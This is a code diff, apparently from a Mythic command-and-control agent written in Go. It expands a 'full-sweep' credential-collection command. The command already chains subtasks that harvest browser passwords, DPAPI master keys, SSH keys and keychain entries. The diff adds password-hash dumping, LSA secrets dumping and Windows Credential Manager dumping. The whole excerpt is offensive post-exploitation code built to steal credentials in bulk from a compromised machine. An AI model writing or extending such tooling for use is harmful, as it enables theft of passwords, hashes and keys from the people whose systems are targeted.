@@ -202,9 +202,9 @@ func init() {
 				return response
 			}
 
-			// full-sweep: exhaustive credential collection (cred-harvest all + browser + dpapi + ssh-keys + keychain)
+			// full-sweep: exhaustive credential collection (cred-harvest all + browser + dpapi + ssh-keys + keychain + hashdump + lsa-secrets + credman)
 			if action == "full-sweep" {
-				display := "Full Credential Sweep (cred-harvest + browser + dpapi + ssh-keys + keychain)"
+				display := "Full Credential Sweep (cred-harvest + browser + dpapi + ssh-keys + keychain + hashdump + lsa-secrets + credman)"
 				response.DisplayParams = &display
 				completionFunc := "fullSweepComplete"
 				response.CompletionFunctionName = &completionFunc
@@ -213,8 +213,11 @@ func init() {
 					{CommandName: "cred-harvest", Params: `{"action":"all"}`},
 					{CommandName: "browser", Params: `{"action":"passwords"}`},
 					{CommandName: "dpapi", Params: `{"action":"masterkeys"}`},
-					{CommandName: "ssh-keys", Params: `{"action":"list"}`},
+					{CommandName: "ssh-keys", Params: `{"action":"enumerate"}`},
 					{CommandName: "keychain", Params: `{}`},
+					{CommandName: "hashdump", Params: `{}`},
+					{CommandName: "lsa-secrets", Params: `{"action":"dump"}`},
+					{CommandName: "credman", Params: `{"action":"dump"}`},
 				}
 
 				groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
